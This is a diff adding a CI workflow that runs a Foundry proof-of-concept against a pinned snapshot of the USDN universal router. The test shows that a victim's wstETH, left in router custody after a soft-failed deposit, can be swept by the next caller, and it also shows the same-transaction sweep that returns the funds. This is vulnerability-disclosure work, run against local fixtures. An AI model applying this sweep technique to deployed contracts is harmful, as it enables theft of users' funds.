@@ -1,0 +1,178 @@
+name: USDN Router soft-fail custody proof
+
+on:
+  push:
+    branches:
+      - security/usdn-router-softfail-sweep
+
+permissions:
+  contents: read
+
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: nightly
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+
+      - name: Clone exact deployed Router snapshot and install dependencies
+        run: |
+          set -euo pipefail
+          git clone https://github.com/SmarDex-Ecosystem/universal-router.git /tmp/router
+          cd /tmp/router
+          git checkout 2b9465ba87c23654c2eacce2088f5794ea08a006
+          git config --global url."https://github.com/".insteadOf "git@github.com:"
+          npm ci
+          forge soldeer install
+
+      - name: Add focused soft-fail custody PoC
+        run: |
+          cat > /tmp/router/test/units/RouterSoftFailSweepPoC.t.sol <<'SOL'
+          // SPDX-License-Identifier: UNLICENSED
+          pragma solidity 0.8.26;
+
+          import { Constants } from "@uniswap/universal-router/contracts/libraries/Constants.sol";
+          import { Wusdn } from "usdn-contracts/src/Usdn/Wusdn.sol";
+          import { IUsdnProtocol } from "usdn-contracts/src/interfaces/UsdnProtocol/IUsdnProtocol.sol";
+          import { ADMIN } from "usdn-contracts/test/utils/Constants.sol";
+          import { UsdnProtocolBaseFixture } from "usdn-contracts/test/unit/UsdnProtocol/utils/Fixtures.sol";
+
+          import { Commands } from "../../src/libraries/Commands.sol";
+          import { RouterParameters } from "../../src/base/RouterImmutables.sol";
+          import { IUsdnProtocolRouterTypes } from "../../src/interfaces/usdn/IUsdnProtocolRouterTypes.sol";
+          import { IPaymentLibTypes } from "../../src/interfaces/usdn/IPaymentLibTypes.sol";
+          import { ISmardexFactory } from "../../src/interfaces/smardex/ISmardexFactory.sol";
+          import { UniversalRouterHandler } from "../integration/utils/Handler.sol";
+
+          contract TestRouterSoftFailSweepPoC is UsdnProtocolBaseFixture {
+              UniversalRouterHandler internal router;
+              Wusdn internal wusdn;
+
+              address internal constant VICTIM = address(0xA11CE);
+              address internal constant ATTACKER = address(0xB0B);
+              uint128 internal constant LIQ_POSITION_AMOUNT = 1 ether;
+              uint256 internal constant VICTIM_AMOUNT = 1 ether;
+
+              function setUp() public {
+                  params = DEFAULT_PARAMS;
+                  params.initialPrice = 1 ether;
+                  _setUp(params);
+
+                  wusdn = new Wusdn(usdn);
+                  RouterParameters memory rp = RouterParameters({
+                      permit2: address(0x1001),
+                      weth9: address(0x1002),
+                      v2Factory: address(0x1003),
+                      v3Factory: address(0x1004),
+                      pairInitCodeHash: bytes32(uint256(1)),
+                      poolInitCodeHash: bytes32(uint256(2)),
+                      usdnProtocol: IUsdnProtocol(address(protocol)),
+                      wstEth: address(wstETH),
+                      wusdn: wusdn,
+                      smardexFactory: ISmardexFactory(address(0x1005))
+                  });
+                  router = new UniversalRouterHandler(rp);
+
+                  // Exact upstream pending-liquidation construction: two liquidatable ticks,
+                  // but only one liquidation iteration is allowed per user action.
+                  setUpUserPositionInLong(
+                      OpenParams({
+                          user: address(this),
+                          untilAction: ProtocolAction.ValidateOpenPosition,
+                          positionSize: LIQ_POSITION_AMOUNT,
+                          desiredLiqPrice: params.initialPrice * 9 / 10,
+                          price: params.initialPrice
+                      })
+                  );
+                  setUpUserPositionInLong(
+                      OpenParams({
+                          user: address(this),
+                          untilAction: ProtocolAction.ValidateOpenPosition,
+                          positionSize: LIQ_POSITION_AMOUNT,
+                          desiredLiqPrice: params.initialPrice * 8 / 10,
+                          price: params.initialPrice
+                      })
+                  );
+                  skip(30 minutes);
+                  vm.prank(ADMIN);
+                  protocol.setLiquidationIteration(1);
+
+                  wstETH.mintAndApprove(VICTIM, VICTIM_AMOUNT, address(router), type(uint256).max);
+              }
+
+              function _softFailDepositInput(address to, address validator) internal view returns (bytes memory) {
+                  return abi.encode(
+                      IUsdnProtocolRouterTypes.InitiateDepositData({
+                          payment: IPaymentLibTypes.PaymentType.Transfer,
+                          amount: Constants.CONTRACT_BALANCE,
+                          sharesOutMin: 0,
+                          to: to,
+                          validator: validator,
+                          deadline: type(uint256).max,
+                          currentPriceData: abi.encode(params.initialPrice * 7 / 10),
+                          previousActionsData: EMPTY_PREVIOUS_DATA,
+                          ethAmount: 0
+                      })
+                  );
+              }
+
+              function test_softFailLeavesVictimAssetSweepableByNextCaller() public {
+                  vm.prank(VICTIM);
+                  wstETH.transfer(address(router), VICTIM_AMOUNT);
+
+                  bytes memory commands = abi.encodePacked(uint8(Commands.INITIATE_DEPOSIT));
+                  bytes[] memory inputs = new bytes[](1);
+                  inputs[0] = _softFailDepositInput(VICTIM, VICTIM);
+
+                  vm.prank(VICTIM);
+                  router.execute(commands, inputs);
+
+                  // No deposit was created: the Protocol returned false before payment callback.
+                  assertEq(uint256(protocol.getUserPendingAction(VICTIM).action), uint256(ProtocolAction.None));
+                  assertEq(wstETH.balanceOf(address(router)), VICTIM_AMOUNT, "victim funds remain in shared router custody");
+
+                  bytes memory sweepCommands = abi.encodePacked(uint8(Commands.SWEEP));
+                  bytes[] memory sweepInputs = new bytes[](1);
+                  sweepInputs[0] = abi.encode(address(wstETH), ATTACKER, 0, 0);
+
+                  vm.prank(ATTACKER);
+                  router.execute(sweepCommands, sweepInputs);
+
+                  assertEq(wstETH.balanceOf(ATTACKER), VICTIM_AMOUNT, "next caller sweeps victim funds");
+                  assertEq(wstETH.balanceOf(address(router)), 0, "router drained");
+              }
+
+              function test_officialSameTransactionSweepReturnsSoftFailedAssetToVictim() public {
+                  vm.prank(VICTIM);
+                  wstETH.transfer(address(router), VICTIM_AMOUNT);
+
+                  bytes memory commands = abi.encodePacked(
+                      uint8(Commands.INITIATE_DEPOSIT),
+                      uint8(Commands.SWEEP)
+                  );
+                  bytes[] memory inputs = new bytes[](2);
+                  inputs[0] = _softFailDepositInput(VICTIM, VICTIM);
+                  inputs[1] = abi.encode(address(wstETH), VICTIM, 0, 0);
+
+                  uint256 victimBefore = wstETH.balanceOf(VICTIM);
+                  vm.prank(VICTIM);
+                  router.execute(commands, inputs);
+
+                  assertEq(wstETH.balanceOf(address(router)), 0, "cleanup sweep empties router");
+                  assertEq(wstETH.balanceOf(VICTIM), victimBefore + VICTIM_AMOUNT, "victim receives stranded asset back atomically");
+              }
+          }
+          SOL
+
+      - name: Run exact PoC against deployed-era code
+        env:
+          FOUNDRY_PROFILE: default
+        run: |
+          set -euo pipefail
+          cd /tmp/router
+          forge test --match-contract TestRouterSoftFailSweepPoC -vvv
